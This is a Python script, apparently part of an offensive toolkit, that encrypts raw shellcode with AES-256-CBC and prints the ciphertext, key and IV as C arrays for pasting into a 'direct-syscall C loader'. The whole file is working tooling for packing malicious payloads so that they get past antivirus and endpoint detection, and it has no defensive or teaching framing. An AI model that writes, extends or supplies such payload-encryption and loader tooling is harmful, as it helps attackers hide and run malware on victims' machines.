#!/usr/bin/env python3
"""
encryptor.py - AES-256-CBC (PKCS#7) shellcode encryptor for the
direct-syscall C loader (Pasted_text.txt / loader_aes.c).

Generates a random 32-byte key + 16-byte IV (or accepts fixed values) and
emits ready-to-paste C arrays:

    static const unsigned char Payload[]   = { ... };  ciphertext
    static const unsigned char g_AesKey[32]= { ... };
    static const unsigned char g_AesIv[16] = { ... };

Usage:
    python3 encryptor.py shellcode.bin
    python3 encryptor.py shellcode.bin --key-hex <64hex> --iv-hex <32hex>
    python3 encryptor.py shellcode.bin --out cipher.bin
    python3 encryptor.py shellcode.bin --no-verify

Dependencies: pycryptodome (preferred) or the `cryptography` package.
"""
import argparse
import hashlib
import os
import sys

AES_BLOCK = 16
KEY_LEN = 32
IV_LEN = 16


def _backend():
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        return AES, pad
    except ImportError:
        return None, None


def encrypt(key, iv, plaintext):
    AES, pad = _backend()
    if AES is not None:
        return AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, AES_BLOCK))
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    padder = padding.PKCS7(128).padder()
    data = padder.update(plaintext) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    return enc.update(data) + enc.finalize()


def decrypt(key, iv, ciphertext):
    AES, _ = _backend()
    if AES is not None:
        from Crypto.Util.Padding import unpad
        return unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext), AES_BLOCK)
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    dec = Cipher(algorithms.AES(key), modes.CBC(iv)).decryptor()
    data = dec.update(ciphertext) + dec.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(data) + unpadder.finalize()


def to_c_array(name, data, per_line=12):
    body = []
    for i in range(0, len(data), per_line):
        body.append("\t" + ", ".join("0x%02X" % b for b in data[i:i + per_line]) + ",")
    return "static const unsigned char %s[%d] = {\n%s\n};" % (name, len(data), "\n".join(body))


def main():
    p = argparse.ArgumentParser(
        description="AES-256-CBC shellcode encryptor for the syscall loader",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("input", help="raw shellcode file (.bin)")
    p.add_argument("--key-hex", dest="key_hex", help="32-byte key as 64 hex chars (default: random)")
    p.add_argument("--iv-hex", dest="iv_hex", help="16-byte IV as 32 hex chars (default: random)")
    p.add_argument("--out", dest="out", help="also write ciphertext to this file")
    p.add_argument("--no-verify", action="store_true", help="skip decrypt round-trip self check")
    args = p.parse_args()

    try:
        with open(args.input, "rb") as f:
            plain = f.read()
    except OSError as e:
        sys.exit(f"[!] cannot read {args.input}: {e}")
    if not plain:
        sys.exit("[!] input is empty")

    def parse_hex(s, n, what):
        try:
            b = bytes.fromhex(s)
        except ValueError:
            sys.exit(f"[!] {what} is not valid hex")
        if len(b) != n:
            sys.exit(f"[!] {what} must be {n * 2} hex chars, got {len(b) * 2}")
        return b

    key = parse_hex(args.key_hex, KEY_LEN, "key") if args.key_hex else os.urandom(KEY_LEN)
    iv = parse_hex(args.iv_hex, IV_LEN, "iv") if args.iv_hex else os.urandom(IV_LEN)

    ct = encrypt(key, iv, plain)

    if not args.no_verify:
        back = decrypt(key, iv, ct)
        if back != plain:
            sys.exit("[!] round-trip verification FAILED - aborting")
        print(f"[+] round-trip verification OK")

    print(f"[+] plaintext : {len(plain)} bytes")
    print(f"[+] ciphertext: {len(ct)} bytes (PKCS#7 padded)")
    print(f"[+] key       : {key.hex()}")
    print(f"[+] iv        : {iv.hex()}")
    print()
    print("/* AES-256-CBC encrypted shellcode - paste into the loader */")
    print(to_c_array("Payload", ct))
    print()
    print(to_c_array("g_AesKey", key))
    print()
    print(to_c_array("g_AesIv", iv))

    if args.out:
        with open(args.out, "wb") as f:
            f.write(ct)
        print(f"\n[+] ciphertext written to {args.out}")


if __name__ == "__main__":
    main()
